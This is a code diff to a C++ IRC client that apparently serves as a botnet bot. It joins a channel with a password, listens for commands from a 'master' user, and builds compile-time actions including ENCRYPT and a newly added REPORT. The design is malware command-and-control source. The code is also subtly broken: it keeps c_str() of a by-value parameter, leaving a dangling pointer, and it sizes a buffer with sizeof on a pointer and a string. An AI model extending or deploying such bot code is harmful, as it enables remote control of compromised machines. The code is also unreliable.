@@ -5,8 +5,8 @@
 #include <string>
 #include <csignal>
 
-IrcClient::IrcClient(const char* server, int port, const char* exeName)
-    : server(server), port(port), exeName(exeName), session(nullptr) {
+IrcClient::IrcClient(std::string server, int port, const char* exeName, std::string botNick, std::string botUser, std::string assignedChannel, std::string botPass)
+    : server(server.c_str()), port(port), exeName(exeName), botNick(botNick), botUser(botUser), assignedChannel(assignedChannel), botPass(botPass), session(nullptr) {
     memset(&callbacks, 0, sizeof(callbacks));
     callbacks.event_connect = event_connect;
     callbacks.event_quit = dump_event;
@@ -95,12 +95,14 @@ void IrcClient::event_connect(irc_session_t* session, const char* event, const c
 
     IrcClient* instance = getInstance(session);
     if (instance) {
-        instance->sendCommand("/VALIDATE test123 BOT");
-        instance->sendCommand("/NICK bot");
-        instance->sendCommand("/USER botNick 0 * botUser");
-        instance->sendCommand("/JOIN #testChannel");
-        instance->sendCommand("/LIST *");
-        instance->sendCommand("/NAMES #testChannel");
+        std::string validateCmd = "/VALIDATE " + instance->botPass + " BOT";
+        std::string nickCmd = "/NICK " + instance->botNick; 
+        std::string userCmd = "/USER " + instance->botUser + " 0 * " + instance->botUser;
+        std::string joinCmd = "/JOIN " + instance->assignedChannel;
+        instance->sendCommand(validateCmd);
+        instance->sendCommand(nickCmd);
+        instance->sendCommand(userCmd);
+        instance->sendCommand(joinCmd);
     }
 }
 
@@ -133,7 +135,7 @@ void IrcClient::parseEvent(irc_session_t* session, const char* event, const char
         return;
     }
 
-    const char* masterIdentifier = "Master!masterUser@";
+    const char* masterIdentifier = "master!masterUser@";
     size_t size1 = sizeof(masterIdentifier);
     size_t size2 = sizeof(instance->server);
     char buffer[size1 + size2 + 1];
@@ -157,6 +159,13 @@ void IrcClient::createAction(ActionInfo actionInfo) {
     if (actionInfo.getActionType() == ActionType::ENCRYPT) { // check if bot was compiled to support this
         printf("ENCRYPT created\n");
         action = new EncryptAction(actionInfo.getActionParams());
+    }
+    #endif
+
+    #ifdef ENABLE_REPORT_ACTION
+    if (actionInfo.getActionType() == ActionType::REPORT) {
+        printf("REPORT created\n");
+        action = new ReportAction(actionInfo.getActionParams());
     }
     #endif
 
